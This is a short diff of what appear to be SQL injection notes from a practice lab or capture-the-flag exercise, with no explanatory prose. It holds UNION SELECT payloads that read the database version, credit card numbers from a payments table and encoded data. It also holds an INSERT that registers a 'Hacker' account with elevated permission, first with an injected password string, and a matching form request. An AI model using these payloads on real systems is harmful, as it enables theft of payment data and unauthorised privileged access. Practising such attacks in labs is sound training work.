@@ -6,7 +6,7 @@ UNION SELECT @@VERSION,2,3
 UNION SELECT creditcard_number,2,3 FROM sqlinjection.payments
 UNION SELECT data,2,3 FROM sqlinjection.share4 <----------- DECODE FROM BASE64
 
-INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('', '', 'Hacker', ''' or 1=''1', 'a', 1)
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('', '', 'Hacker', '1', '2', 3)
 firstname=Hac&lastname=Ker&username=Hacker&password=hacker&email=hack%40gmail.com&permission=1&submit=Register
 
 
